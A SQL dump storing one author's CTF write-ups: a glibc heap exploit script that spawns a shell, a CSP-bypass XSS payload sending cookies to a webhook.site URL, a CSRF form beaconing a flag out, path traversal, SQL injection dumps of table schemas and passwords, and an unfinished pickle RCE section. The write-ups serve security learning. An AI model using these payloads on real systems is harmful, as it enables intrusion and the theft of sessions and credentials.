insert into writeup (challenge_id, poster_username, is_private)
values (1, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Baby heap\n\n> Let\'s get you all warmed up with a classic little 4-function heap challenge, with a twist ofc.\n>\n> `nc hack.scythe2021.sdslabs.co 17169`\n>\n> `static.scythe2021.sdslabs.co/static/babyHeap/libc-2.31.so`\n>\n> `static.scythe2021.sdslabs.co/static/babyHeap/babyHeap`\n\n\n\nAs stated in the description, we can allocate, free, edit and view chunks. Sounds like a simple heap UAF/double free right? Let\'s look into the code.\n\nWhen we allocate chunks, we can either allocate small (128 bytes), medium (512 bytes) or large (1040 bytes) chunks. This gives us access to both the tcache and unsort bins, which is really useful for leaking libc addresses and stuff.\n\nThe `allocate_chunks` function is called to allocate chunks:\n\n```c\nunsigned __int64 allocate_chunks(){\n  unsigned int v1; // [rsp+Ch] [rbp-14h] BYREF\n  int v2; // [rsp+10h] [rbp-10h] BYREF\n  unsigned int i; // [rsp+14h] [rbp-Ch]\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  printf("How many chunks do you wanna allocate: ");\n  v1 = 0;\n  __isoc99_scanf("%u", &v1);\n  puts("Select the size: ");\n  chunk_menu();\n  v2 = 0;\n  __isoc99_scanf("%d", &v2);\n  for ( i = 0; i < v1; ++i ){\n    increment_a();\n    allocate_chunk(v2);\n  }\n  return __readfsqword(0x28u) ^ v4;\n}\n__int64 increment_a(){\n  return (unsigned int)++chunk_index_a;\n}\n```\n\nThe user specifies the number of chunks, as well as the chunk size by entering either 1, 2 or 3. For each chunk the user wants to create, `chunk_index_a` is incremented and the `allocate_chunk` function is called with the chunk size choice.\n\n```c\nvoid __fastcall allocate_chunk(int choice)\n{\n  int v1; // ebx\n  int v2; // [rsp+1Ch] [rbp-14h]\n\n  if ( choice == 3 ) {\n    v2 = 128;\n  }  else {\n    if ( choice > 3 )\n      return;\n    if ( choice == 1 ) {\n      v2 = 1040;\n    } else{\n      if ( choice != 2 )\n        return;\n      v2 = 512;\n    }\n  }\n  if ( (unsigned int)chunk_index_b > 0x10 )\n    exit(0);\n  v1 = chunk_index_b++;\n  chunks[v1] = malloc(v2);\n}\n```\n\nOne thing to note is the function returns if `choice > 3`, and there is no bounds checking elsewhere. If the choice is valid, `chunk_index_b` is incremented and a chunk is `malloc`ed and stored in the chunks array. Now, we have two variables that store the number of chunks allocated. \n\nHowever, we can get these two variables to differ by entering a chunk size choice that is greater than 3. This will cause `chunk_index_a` to be incremented, but `allocate_chunk` will return before `chunk_index_b++` is executed, so `chunk_index_a` can be manipulated to be greater than `chunk_index_b`.\n\nLet\'s look at the free function now:\n\n```c\nunsigned __int64 free_last_chunk(){\n  unsigned __int64 result; // rax\n\n  result = (unsigned int)chunk_index_b;\n  if ( chunk_index_b ) {\n    if ( chunk_index_a > (unsigned int)chunk_index_b ) {\n      fwrite("Hacking detected!!!\nExiting...\n", 1uLL, 0x1FuLL, stderr);\n      exit(0);\n    }\n    free((void *)chunks[--chunk_index_b]);\n    --chunk_index_a;\n    result = (unsigned __int64)chunks;\n    chunks[chunk_index_a] = 0LL;\n  }\n  return result;\n}\n```\n\nWe\'re not allowed to specify an index to free, so we can only free the last allocated chunk. Also, `chunk_index_a` must not be greater than `chunk_index_b`, which disrupts the bug we found earlier. Additionally, the pointer to the freed chunk is zeroed out, so there is no use after free here. However, the freed chunk is indexed by `chunk_index_b`, while `chunk_index_a` controls which chunk is zeroed out. If we can these two variables to differ, we can get a use after free!\n\nHowever, it seems this is prevented by the check that `chunk_index_a <= chunk_index_b`. When dealing with these kinds of problems, there are usually 2 bugs to consider:\n\n- behaviour with negative numbers/integer underflow\n- behaviour with very large numbers (integer overflow)\n\nIf we can increment `chunk_index_a` to a very large value, it will overflow and become 0. This value is around 4 billion, which means it will take quite a bit of time to run. Another problem is we need to ensure that `chunk_index_a` is not negative and it doesn\'t overwrite any pointer we will need.\n\nAnyway we\'ve gone through all the bugs in this program, so let\'s go on to the exploit.\n\n## Exploit\n\nOur exploit will follow the general pattern of \n\n- free large chunk to unsort bin\n- read chunk metadata to leak libc base\n- write chunk metadata of tcache chunk to `__free_hook` or `__malloc_hook`\n- malloc chunks until a pointer to one of the hooks is returned\n- write one_gadget to that hook\n- trigger one_gadget\n- get shell!\n\nFor the exploit, I allocated a large (1040 byte) chunk and 2 small (128 byte) chunks. To ensure that `chunk_index_a` is zeroing out chunk pointers that we don\'t need, I allocated 3 chunks (size doesn\'t matter here) before allocating the 3 chunks that we need.\n\nAt this point, both chunk indexes are 6. \n\nThen, I "allocated" `4294967293` chunks of size `10`, which doesn\'t exist. This results in `chunk_index_a` overflowing to 3, while `chunk_index_b` remains 6. Thus, when we free the 3 active chunks (3,4,5), these chunks get freed, but the pointers to (0,1,2) get zeroed out instead.\n\nOnce we\'ve freed these chunks, we can view the contents of chunk 3, which leaks the libc base. Then, we write `__free_hook` to the `next` pointer of chunk 4 (which is freed to the tcache). Thus, when we `malloc` a couple of chunks, we will end up with a pointer to the `__free_hook`. \n\nAt this point, `chunk_index_a` is 0, while `chunk_index_b` is 3. I then allocated 3 more small chunks (probably a bit too many), and found that chunk 4 points to `__free_hook`.\n\nWe can then grab a one gadget and write its address to `__free_hook`. Now, all we need to do is free a chunk, and we will get our shell! \n\nUnfortunately, I couldn\'t find a suitable one gadget, since the `rdx` register was polluted with some data from other function calls. I was stuck here for quite a while as I tried to use different methods to change the value of this register.\n\nEventually, I decided to try a new approach. Looking through the documentation for `__free_hook`, it is actually called with `$rdi=address of freed buffer`. Therefore, if we write the address of `system` to `__free_hook` and free a chunk that starts with the string `/bin/sh`, we can get a shell! Fortunately, with a little bit of tweaking the heap layout, I was able to get this attack to work.\n\n## Script\n\n```python\n#!/usr/bin/env python3\nfrom pwn import *\n\nexe = ELF("./babyHeap")\nlibc = ELF("./libc-2.31.so")\nld = ELF("./ld-2.31.so")\n\ncontext.binary = exe\n\ndef malloc(num: int, size: int):\n    p=q\n    p.recvuntil(\'>>\')\n    p.sendline(\'1\')\n    p.recvuntil(\'How many chunks do you wanna allocate:\')\n    p.sendline(str(num))\n    p.recvuntil(\'>>\')\n    p.sendline(str(size))\n\ndef view(index: int):\n    p=q\n    p.recvuntil(\'>>\')\n    p.sendline(\'4\')\n    p.recvuntil(\'Index to view:\')\n    p.sendline(str(index))\n\ndef free():\n    p=q\n    p.recvuntil(\'>>\')\n    p.sendline(\'2\')\n\n\ndef edit(index: int, size: int, data: bytes|str):\n    # Workaround for weird vs code bug\n    p=q\n    p.recvuntil(\'>>\')\n    p.sendline(\'3\')\n    p.recvuntil(\'Index to edit:\')\n    p.sendline(str(index))\n    p.recvuntil(\'Enter size:\')\n    p.sendline(str(size))\n    p.clean()\n    p.sendline(data)\n\n\ndef conn():\n    if args.LOCAL:\n        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})\n    else:\n        return remote("hack.scythe2021.sdslabs.co", 17169)\n\nq = None\ndef main():\n    r = conn()\n    e = elf\n    p = r\n    global q\n    q = p\n\n    malloc(4,1)\n    malloc(2,3)\n    malloc(4294967293,10)\n    free()\n    free()\n    free()\n    print("Freed!")\n    view(3)\n    leak = p.recvline(keepends=False)[1:]\n    print(leak, len(leak))\n    leak = u64(leak + b"\0\0")\n    libc.address = leak-0x1ebbe0\n    print(hex(leak), hex(libc.address))\n    edit(4,9,p64(libc.sym.__free_hook))\n\n    print("Wrote free hook")\n    malloc(3,3)\n    edit(4,9, p64(libc.sym.system))\n    malloc(1,3)\n    edit(6,8,b"/bin/sh")\n\n    free()\n\n    r.interactive()\n\n\nif __name__ == "__main__":\n    main()\n```\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (2, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# SCAndal\n\n>  Your aim is to identify the 6 removed values, sort them in ascending order, then your flag would be `flag{num[0],num[1],num[2],num[3],num[4],num[5]}` \n>\n> For example:\n> if the missing numbers are [1, 69, 42, 169, 142, 242], the flag would be `flag{1,42,69,142,169,242}`.\n\nWe are given a C file that contains a custom binary search implementation, as well as some sort of serial communications. \n\n```c\nint main(void) {\n  platform_init();\n  init_uart();\n  trigger_setup();\n  simpleserial_init();\n\n  int key = 0xdeadbeef; // ofc it is a dummy value\n\n  srand(key);\n  remove_six();\n\n  simpleserial_addcmd(\'s\', 1, search);\n\n  while(1) simpleserial_get();\n  return 0;\n}\n```\n\nAfter initializing the serial communications, the function calls `remove_six`. \n\n```c\nvoid remove_six(void) {\n  for (uint8_t i = 1 ; i <= 6; i++) {\n    uint8_t rep = rand();\n    arr[256] = arr[rep];\n    memmove(&arr[rep], &arr[rep+1], (256-rep)*sizeof(arr[0]));\n  }\n}\n```\n\nThis function randomly picks and removes 6 elements from the array. The array is a 257 element array containing the numbers 0 to 255 in order, with a 0 at the end. Our task is to find out which 6 elements were removed. The program then configures the `search` function to handle the command `s`. \n\n```c\nuint8_t search(uint8_t* data, uint8_t dlen)\n{\n  trigger_high();\n  binary_search(0, 249, data[0]);\n  trigger_low();\n  return 0;\n}\n```\n\nThis function calls `trigger_high`, binary searches a value in the array, then calls `trigger_low`. This might be manipulating the serial communications. If we can get the time between `trigger_high` and `trigger_low`, we could find out how long it takes to binary search each number, thus leaking information about the elements in the array.\n\nThis data is provided in the `traces.npy` file, generated by the `get_traces.py` file. It contains a 2D array of dimensions `(256,3000)`, with float values in `(-0.5, 0.5)`. I plotted the first row in matplotlib to visualize it:\n\n![image-20211226063532868](./images/plot1.png)\n\nWe can clearly see a region in the middle where the magnitude of the lines are consistently much greater than at the ends. This should be the time period where the binary search is running. I decided to extract this time period by finding the first and last value where the reading is below -0.4, and finding the number of readings between them. Again, I plotted this with matplotlib.\n\n![image-20211226064030435](./images/plot2.png)\n\nI was incredibly surprised by this result as I didn\'t expect it to work so well. We can clearly see 6 values where the time taken is less than 2100. I think I was just really lucky to have chosen -0.4 as the threshold value as no other number has such a clear result. \n\n![image-20211226064543051](./images/results.png)\n\n\n\nWhat was weird to me was the timings for the removed values were much lower than expected. In my tests using python, the removed values required more calls to `binary_search`. I\'ve also attached the Jupyter notebook [here](files/solve.ipynb) as well as the [trace data](./files/traces.npy) so you can play with it.\n\n\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (3, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Completely secure publishing\n\nThis challenge is obviously an XSS based challenge that has content security policy enabled.\n\nThe CSP is very secure, with `default-src: \'none\'; connect-src \'none\';`.\n\nHowever, something interesting is the site sets the CSP using some user input: ```report-uri /report-csp-violation?id=${req.params.id}`);`` :thinking:. `req.params.id` is checked such that a document with such an ID exists in the database. If we can somehow control this ID, we can inject stuff into the CSP. \n\nFortunately, there is no check when inserting into the DB, so we can control this ID. However, if we inject `script-src \'unsafe-inline\'` it still doesn\'t work since the browser takes the first directive. Fortunately, [script-src-elem](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-elem) is a newly introduced directive that  overrides `script-src` for script tags. However, with `connect-src: \'none\'`, how are we going to get the flag out? \n\nIt seems [connect-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src) only applies to `fetch` and a few other APIs. One way to circumvent this is to dynamically create another script tag that has a `src` set to some other site. This is possible because we can whitelist the external site through the `srcipt-src-elem`.\n\nFinal payload:\n\n```json\n{\n    "title":"Hello, world",\n    "content":"<script>var script = document.createElement(\'script\');script.src = `http://webhook.site/004a7611-4cc0-49de-99e5-c6a84e8ff031?${btoa(document.cookie)}`;document.head.appendChild(script);</script>",\n    "_id":"givflagpls; script-src-elem \'unsafe-inline\' webhook.site ; abc z;"\n}\n```\n\nOnce the admin\'s cookies are obtained, just set the secret cookie and get the flag:\n\n`bcactf{csp_g0_brr_g84en9}`\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (4, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# phpme\n\nWeb, 469 points (nice), 64 solves\n\nWe\'re given the following code (with some less relevant parts removed):\n\n```php\n<?php\nif ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {\n    if(isset($_COOKIE[\'secret\']) && $_COOKIE[\'secret\'] === $secret) {\n        // https://stackoverflow.com/a/7084677\n        $body = file_get_contents(\'php://input\');\n        if(isJSON($body) && is_object(json_decode($body))) {\n            $json = json_decode($body, true);\n            if(isset($json["yep"]) && $json["yep"] === "yep yep yep" && isset($json["url"])) {\n                echo "<script>\n";\n                echo "    let url = \'" . htmlspecialchars($json["url"]) . "\';\n";\n                echo "    navigator.sendBeacon(url, \'" . htmlspecialchars($flag) . "\');\n";\n                echo "</script>\n";\n            } else {\n                echo "nope :)";\n            }\n        } else {\n            echo "not json bro";\n        }\n    } else {\n        echo "ur not admin!!!";\n    }\n} else {\n    show_source(__FILE__);\n}\n?>\n```\n\nWe\'re also given an admin bot which presumably visits any URL we give it.\n\n\n\nOne of the major challenges is the server requires a POST request, while the admin bot sends a GET request to the URL we give it (you can verify this using a webhook). It\'s clear we will need to submit a link to a website we control. How can we send POST requests?\n\nWell, we can use the JavaScript `fetch` method. However, this fails because of browser restrictions called [Same origin policy (SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). This means that when we use `fetch` (or any other JavaScript method) to send HTTP requests, we cannot access the response body (which contains the flag).\n\nAlternatively, we can use forms, which are exempt from the SOP, since forms are not JavaScript. However, we come up against the requirement that we send a JSON body in our POST request. HTML forms usually send URL-encoded form data, not JSON. For example, for a form like\n\n```html\n<form action="https://example.com" method="POST">\n    <input name="hello" value="world">\n    <input type="submit">\n</form>\n```\n\nwould send a POST request when submitted, with body\n\n```\nhello=world\n```\n\nwhich is clearly not JSON. However, we can manipulate the name and value of the form inputs to make something that looks like JSON.\n\n```html\n<form action="https://example.com" method="POST">\n<input\n    name=\'{"hello":"\'\n    value=\'world"}\'>\n<input type=\'submit\'>\n</form>\n```\n\nWe would expect this to produce\n\n```:"\n{"hello":"=world"}\n```\n\nwhich is valid JSON, but it actually produces\n\n```\n%7B%22hello%22%3A%22=world%22%7D\n```\n\nbecause form data is URL encoded by default.\n\nWe can instruct browsers to disable URL encoding by adding the `enctype=\'text/plain\'` attribute in the form.\n\nOk, so we\'ve found out how to POST JSON using a HTML form. How do we get the flag? We\'re in luck here, because the server sends a response that contains code to send the flag to any URL we want. When the form is submitted, the browser renders the response body and executes any JavaScript code in the response body. Thus, it sends the flag to a webhook, where we are listening.\n\nThe final payload is\n\n```html\n<body>\n \n<form id="f" enctype=\'text/plain\' action="https://phpme.be.ax/" method="POST">\n<input\n    name=\'{"yesp":"\'\n    value=\'a","yep":"yep yep yep","url":"https://webhook.site/31d1e4a0-1abe-4fe8-8dd9-b7fedf6387db/"}\'>\n<input type="submit">\n</form>\n<script>f.submit()</script>\n</body>\n```\n\nAnd the flag is \n\n`corctf{ok_h0pe_y0u_enj0yed_the_1_php_ch4ll_1n_th1s_CTF!!!}`\n\n\n\nNotes: This wouldn\'t usually work unless the cookie was set with `SameSite=None; Secure` which is why the site must be hosted on HTTPS. Read more about SameSite cookies and how they prevent CSRF attacks [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (5, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Secure Flag Distribution Service\n\n> We\'ve recently discovered that APOCALYPSE is running an illegal [flag distribution service](http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50401/) to share flags among all their agents. Can you infiltrate their system and take a look? Seems like they\'re using some OTP system to ensure that only their members can login.\n\nThe challenge consists of two services, `auth-server` and `otp-server`. However, we can only interact with `auth-server`\n\nHere\'s an abbreviated version of each.\n\n`auth-server`\n\n```python\n\n@app.post(\'/request\')\nasync def request_OTP(email: str = Form(...)):\n    r = requests.get(f\'http://{OTP_SERVER}/sendtoken/{email}\')\n    result = r.json()[\'status\']\n\n    if result:\n        return {\'status\': True}\n    return return {\'status\': False}\n\n@app.post(\'/verify\')\nasync def authenticate(token: str = Form(...)):\n    r = requests.get(f\'http://{OTP_SERVER}/verify/{token}\')\n    result = r.json()[\'status\']\n    if result:\n        return {\'status\': True, message: getenv(\'FLAG\')}\n    return return {\'status\': False}\n```\n\n`otp-server`\n\n```python\n@app.get(\'/sendtoken/{email}\')\nasync def send_OTP(email: str):\n    if query_email(email):\n        if not send_otp(generate_token(email), email):\n            return { \'status\': False }\n    return { \'status\': True }\n\n@app.get(\'/verify/{token}\')\nasync def verify_OTP(token: str):\n    if not is_token_valid(token):\n        return { \'status\': False }\n    invalidate_token(token)\n    return { \'status\': True }\n```\n\nThis challenge is quite difficult to analyze as there are so many parts and it\'s not obvious what the vulnerable part is. Let\'s look at it part by part.\n\n## `send_OTP`\n\n```python\nasync def send_OTP(email: str):\n    if query_email(email):\n        if not send_otp(generate_token(email), email):\n            return { \'status\': False }\n    return { \'status\': True }\n```\n\nThere\'s a lot of useless red herrings here. This function doesn\'t actually send any emails, nor does it do any validation on the email (at least not as far as I can tell). We can just treat it as a route that always returns `{ \'status\': True }`. This will be useful later.\n\n## `verify_OTP`\n\n```python\nasync def verify_OTP(token: str):\n    if not is_token_valid(token):\n        return { \'status\': False }\n    invalidate_token(token)\n    return { \'status\': True }\n```\n\nAgain, this function doesn\'t actually do anything. Maybe it does, but until we can guess a valid OTP, it will always return `{ \'status\': False }`. If you\'ve analyzed up to here, you\'ll probably think this challenge is some kind of web + crypto thingy where OTP is an JWT or flask token. At least that\'s what I thought during the CTF.\n\n## `request_OTP`\n\n```python\nasync def request_OTP(email: str = Form(...)):\n    r = requests.get(f\'http://{OTP_SERVER}/sendtoken/{email}\')\n    result = r.json()[\'status\']\n\n    if result:\n        return {\'status\': True}\n    return return {\'status\': False}\n```\n\nThis code reads `email` from the post data and sends it to the OTP server\'s `send_OTP` function. The vulnerable code is here, but it\'s so innocent it\'s easy to miss. \n\n```python\nr = requests.get(f\'http://{OTP_SERVER}/sendtoken/{email}\')\n```\n\nPython\'s f-strings are really useful for concatenating stuff together. However, when dealing with URLs and paths, we need to be extra careful to deal with [path traversal](https://owasp.org/www-community/attacks/Path_Traversal) attacks. For example, if `email=../`, the effective request URL would be `f\'http://{OTP_SERVER}/\'` as `..` instructs the web server to load a resource from the parent directory. \n\nUsing this attack, we can actually control the value of `r` by pointing the request URL to something we want. To get the flag, we want something that returns `{\'status\': True}`, like `send_OTP`. \n\nThus the final payload:\n\n```\ncurl -X POST -d "token=../sendtoken/bleh" http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50401/verify\n```\n\nFlag:\n\n```\nCyberthon{h3y_5h4r1ng_fl4g5_15_4g41n5t_th3_rul35}\n```\n\n\n\nThis challenge is so easy to exploit yet the exploit is so easy to miss. It\'s not surprising nobody solved it during the CTF.\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (6, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Secret base 1\n\n> Category: Web\n\n> APOCALYPSE hired an administrator improve the physical security of their secret base.\n> Your task is to gain access to the physical security device.\n\n>  The flag for this challenge is similar to Cyberthon{h...e} (starts with \'h\' and ends with \'e\').\n\nThis is a typical SQL injection challenge without any filters. Database is sqlite, with table `users_table` from a HTML comment in the login page.\n\nStarting with payload `username = admin\';#` we get an error that the password for `admin` is incorrect. Thus, the query executed is probably something like\n\n```python\ndata = query(f"select * from users_table where username=\'{username}\'")\nif (data["password"] == password):\n   # ...\n```\n\nWe can use union SQL injection to control returned password. But first, we need to find out how many columns there are in the `users_table`. `username = a\' union select \'a\', \'b\', \'c\';#`  produces no error so there are 3 columns. Additionally we get a message `Invalid password for b`, so the second column is the username. Let\'s investigate further by dumping the SQL of the `users_table`.\n\n````\nPayload: username = a\' union select \'a\', sql, \'c\' from sqlite_master where tbl_name=\'users_table\';#\nResponse: Invalid password for CREATE TABLE users_table(id INTEGER PRIMARY KEY, username TEXT, password TEXT)!\n````\n\nOur hypothesis is correct. We can continue to use this approach to dump more info from the table.\n\n```\nPayload: username = a\' union select \'a\', password, \'c\' from users_table;#\nResponse: Invalid password for Adm1nP@s5w0rd123!@#!\n```\n\nPresumably, this is the admin\'s password. Still no flag tho. Let\'s look at other users\' passwords\n\n```\nPayload: username = a\' union select \'a\', password, \'c\' from users_table where username not like \'admin\';#\nResponse: Invalid password for Cyberthon{h3re5_0nE_f1Ag_1N_d@taBa5e}! \n```\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (7, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Secret base 2\n\nThis challenge is quite annoyingly similar to secret base 1.\n\nLet\'s do some more poking around: I\'ll just show the union part for brevity\n\n```sql\nPayload: union select  tbl_name, sql , \'abcd\' from sqlite_master where tbl_name not like \'users_table\';--\nResponse: Invalid password for CREATE TABLE keep_looking(keep TEXT, looking TEXT )!\n```\n\nHmm\n\n```sql\nPayload: union select  tbl_name, sql , \'abcd\' from sqlite_master where tbl_name not like \'users_table\' and tbl_name not like \'keep_looking\';--\nResponse: Invalid password for CREATE TABLE s3cr3t_table(f1r5t_c0lumn TEXT, s3c0nd_c0lumn TEXT,\n			s3cr3t_c0lumn TEXT )! \n```\n\nHmm!\n\n```sqlite\nPayload: union select  f1r5t_c0lumn,s3cr3t_c0lumn , \'abcd\' from s3cr3t_table;--\nResponse: Invalid password for Cyberthon{an0th3r_fl@g_1n_dAtab@se}! \n```\n\n!!\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (8, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Secret base 3\n\nThis challenge is slightly different from the others. Poking further in the `users_table`, we find the password for `proxy`\n\n```\nPayload: username = a\' union select \'a\', password, \'c\' from users_table where username not like \'admin\' and username not like \'flag\';#\nResponse: Invalid password for Sup3Rsecur3pR0xYPa5Sw0rd! \n```\n\nGoing over to the `proxy.php` page in the web app, we can enter a URL and the page will say we are surfing < that URL>. However, if we attempt to surf a `webhook.site` url, no request is received. This is the guessy part. If we enter exactly `http://localhost/camera.php` however, a 3D image is displayed. Navigating around the image, we find a QR code which contains the flag: `Cyberthon{All_Y0ur_B@s3_Are_B3l0ng_T0_uS}`.\n\n\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (9, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Login portal\n\n> During our investigations, we\'ve manage to find the [login portal](http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50201/) for APOCALYSE members. Seems like all you have to do is login to get the flag, but it seems to be pretty damn secure since they actually filter user input and use password hashes. :(\n\nAbbreviated version of attached `login.php`:\n\n```php\n$username = htmlentities($_POST["username"], ENT_QUOTES);\n$agent_id = htmlentities($_POST["agent_id"], ENT_QUOTES);\n$sql = "SELECT password FROM users WHERE username=\'$username\' AND agent_id=\'$agent_id\'";\n\n$result = mysqli_query($conn, $sql);\n\n$user = $result->fetch_row();\n\nif ($user[0] === hash(\'sha256\', $_POST["password"])) {\n	echo getenv("FLAG");\n} else {\n	echo "Login Failed";\n}\n```\n\nThis is clearly an SQL injection attack, but with some mitigations.\n\nThe [`htmlentities`](https://www.php.net/manual/en/function.htmlentities.php) function, with `ENT_QUOTES` turns special characters like `\'` into the corresponding HTML entity. For example,         `htmlentities("\' or 1=1;--", ENT_QUOTES);` returns `&#039; or 1=1;--`, completely foiling our attack. We will need to use an alternative approach.\n\n## Less is more\n\nSometimes, in SQL injection, we can try to disable some characters instead of adding them. This is especially useful in these kinds of challenges, where a filter prevents the use of `\'`.\n\nLet\'s see what happens when we set `username = \ ` and `agent_id =  abcd__   `  \n\n```php\n$sql = "SELECT password FROM users WHERE username=\'\' AND
        agent_id =\' abcd__\'";\n// I shall replace \' with X to make it clearer\n$sql = "SELECT password FROM users WHERE username=\'X AND agent_id=\' abcd__\'";\n```\n\nWe have \'disabled\' the closing quote character, turning it into a normal character with no special meaning as `
\` is the escape character. When the query is executed, MySQL will read from the first `
\'`  at `username=\'` to the next quote at `agent_id=\'` and essentially interpret `\'\' AND agent_id=
\'` as a string. This leaves `$agent_id` unquoted, allowing us to execute an SQL injection attack!\n\n## Union\n\nIn the next part of the challenge, we need to make the query return a value that\'s equal to the hash of `$_POST[\'password\']`, which we control. The hash is compared using `===` so we can\'t just use magic hashes. Let\'s set `password = abcde`. Its corresponding hash is `36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c`. Now, we can unite these two parts using a union SQL injection.\n\n```\nusername = \\npassword = abcde\nagent_id = union select \'36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c\'--\n```\n\nBut we come up against the constraint that quotes are not allowed. Fortunately, MySQL allows hex string literals. For example, `select 0x68656c6c6f20776f726c64;` will return `hello world`. If you don\'t believe me, you can try it in a MySQL console.\n\nA quick script to convert a (byte) string to hex is `binascii`\'s `b2a_hex`.\n\n```python\nfrom binascii import *\nb2a_hex(b"hello world")\nb\'68656c6c6f20776f726c64\'\n```\n\nUsing this function, we can convert `36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c` to `0x33366262653530656439363834316431303434336263623637306436353534663061333462373631626536376563396334613861643263306334346361343263`, eliminating the need to use quotes. Thus the final attack is (copied curl from postman):\n\n```\ncurl --location --request POST \'http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50201/login.php\' \\n--form \'username="\\"\' \\n--form \'agent_id=" union select 0x33366262653530656439363834316431303434336263623637306436353534663061333462373631626536376563396334613861643263306334346361343263;#"\' \\n--form \'password="abcde"\'\n```\n\nFlag: `Cyberthon{4p0c4lypt1c_w0rld_d00m1n4t1on}`\n\n\n\nI made a mistake of omitting `_` in `agent_id` during the CTF. Note to self to be more careful next time.\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (10, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Zero Mart\n\n> APOCALYPSE has recently started ZeroMart, which is a service that lets their agents redeem the latest 0-day exploits with their credits. Seems like their members have been accessing their underground service by using a client program that has been given to them. We\'ve managed to get our hands on the client, so can you try and infiltrate their system? The server runs python 3.7\n\n>  Note: flag.txt is located at `/app/flag.txt`. Also you might need to install the python requests library to get the client running.\n\nHere\'s an abbreviated version of the attached `client.py`:\n\n```python\nsession = requests.Session()\nr = session.get(ENDPOINTS[\'init\'])\nbalance = r.json()[\'balance\']\nshop = r.json()[\'shop\']\nwhile True:\n    menu()\n    choice = input(\'Choice: \')\n    r = session.post(ENDPOINTS[\'buy\'], json={\'item\': choice})\n    print(f"[+] {r.json()[\'message\']}")\n    if \'balance\' in r.json().keys():\n        balance = r.json()[\'balance\']\n    input(\'Press Enter to continue...\')\n```\n\nInitially, the balance starts off at 1 credit. A large amount of credits is required to buy other items, but `Chipusuketo` can be bought with just 1 credit.\n\n```\nHaatoBurido (31337 Credits)\nPudoru (31337 Credits)\nMerutodaun (31337 Credits)\nRouhanma (31337 Credits)\nSherushoku (31337 Credits)\nEtanaruburu (31337 Credits)\nChipusuketo (1 Credits)\n```\n\nAfter buying `Chipusuketo`, we observe that the balance decreases to zero and we\'re no longer allowed to buy anything. So the balance information must be stored somewhere. But where? Sending the request in Postman reveals a cookie `zero_mart_data="gAN9cQBYBwAAAGJhbGFuY2VxAUsBcy4="`. This is clearly Base64 data, but decoding it produces a bunch of unreadable characters.\n\n## Pickles\n\nHowever, given that the server uses python, we may guess that [python pickles](https://docs.python.org/3/library/pickle.html) have been used to store the data. (This is reinforced by the fact that there is a specific python 3.x version stated, as pickles created with one version may not be decodable by others) Decoding the pickle using `pickle.loads`:\n\n````python\nimport pickle\nimport base64\n\nprint(pickle.loads(base64.b64decode("gAN9cQBYBwAAAGJhbGFuY2VxAUsBcy4=")))\n# => {\'balance\': 1}\n````\n\nNow we know how the data is encoded, we change the balance to whatever we want. For example:\n\n```python\ndef make_cookie(data):\n    c = str(base64.b64encode(data))[2:-1]\n    return \'"\' + c + \'"\'\n\npic = pickle.dumps({"balance":696969})\n\nsession.cookies.set(\'zero_mart_data\', make_cookie(pic),\n                        domain="aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg")\n```\n\nThis allows us to buy whatever we want, but we still can\'t get the flag. We will need to think of something more advanced.\n\n## RCE using pickle\n\nNote: See [Exploiting Python pickles - David Hamann](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) for an in-depth explanation\n\nWhile pickle is frequently used to store python objects in a binary format, deserializing arbitrary pickles is very dangerous and can actually lead to remote code execution. Let\'s see how this works.\n\n```python\nimport pickle\n\nclass Exploit:\n    def __reduce__():\n        return print, ("Hello, world",)\n    \npic = pickle.dumps(Exploit())\ndata = pickle.loads(pic)\n# => Prints "Hello, world"\nprint(data)\n# => None\n```\n\nPython\'s pickle module allows us to customize what will happen when a pickle is deserialized. This is specified through the `__reduce__` method in a class. When an instance of `Exploit` is pickled, the `__reduce__` function is called. The `__reduce__` function should return a tuple of 2 items, a function and a tuple of arguments. Pickle stores these in the pickle. When `pickle.loads` is called, the function stored in the pickle is called with the arguments specified. Thus, in this case, `print("Hello, world")` is executed. The return value of `pickle.loads` is the return value of the function called, which is `None` in the case of `print`.\n\nOne benefit of pickle is that you can store pretty much any function, including Python module functions that are not currently imported. For example,\n\n```python\nimport 